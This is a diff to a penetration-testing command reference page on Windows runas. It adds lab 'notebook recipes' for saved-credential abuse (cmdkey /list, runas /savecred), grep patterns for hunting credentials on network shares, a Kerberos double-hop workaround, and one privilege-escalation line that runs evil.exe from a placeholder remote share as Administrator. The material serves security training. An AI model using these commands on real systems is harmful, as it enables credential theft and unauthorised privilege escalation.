@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=runas) · [All tools](/index)
+
 ## Prompt for credentials
 
 **Windows cmd.exe or PowerShell**
@@ -31,8 +33,128 @@ Check cmdkey /list first. This only works when a matching saved credential is av
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=runas)
+## Notebook recipes
 
-## Learning and original examples
+7 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Find Credentials on Windows](/password-attacks/credential-hunting-in-windows)
+<AccordionGroup>
+
+<Accordion title="Using runas.exe">
+
+### Using runas.exe
+
+**DCSync Lab**
+
+```cmd
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
+Enter the password for INLANEFREIGHT\adunn:
+Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials in Network Shares">
+
+### Find Credentials in Network Shares
+
+**Find Credentials in Network Shares**
+
+```bash
+# the domain prefix (most reliable signal)
+grep -ri "DOMAINNAME\\\\" .
+
+# UPN format
+grep -riE "[a-z]+@domain\.local" .
+
+# runas / net use / Invoke-Command patterns - operators leak creds in commands
+grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .
+
+# anything with "service account" / "svc_" in filenames
+find . -iname "*svc*" -o -iname "*service*account*"
+```
+
+</Accordion>
+
+<Accordion title="High-value Windows locations">
+
+### High-value Windows locations
+
+**Find Credentials on Windows**
+
+```cmd
+cmdkey /list
+runas /savecred /user:DOMAIN\user cmd
+```
+
+</Accordion>
+
+<Accordion title="Workaround #2: Register PSSession Configuration">
+
+### Workaround #2: Register PSSession Configuration
+
+**Kerberos Double Hop**
+
+```powershell
+PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+
+ WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
+ a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
+PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
+WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
+recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
+ required.
+All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
+configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
+
+   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
+
+Type            Keys                                Name
+----            ----                                ----
+Container       {Name=backupadmsess}                backupadmsess
+```
+
+</Accordion>
+
+<Accordion title="13. Attacking Windows Credential Manager">
+
+### 13. Attacking Windows Credential Manager
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```cmd
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+</Accordion>
+
+<Accordion title="EoP - Runas">
+
+### EoP - Runas
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:Administrator "cmd.exe /k whoami"
+```
+
+</Accordion>
+
+<Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">
+
+### 🧾 QUICK REFERENCE — "I see X → do Y"
+
+**Windows Post-Exploitation: Field Reference**
+
+Context from the notebook: cmdkey /list  shows saved creds runas /savecred  as that user
+
+```text
+runas /savecred
+```
+
+</Accordion>
+
+</AccordionGroup>
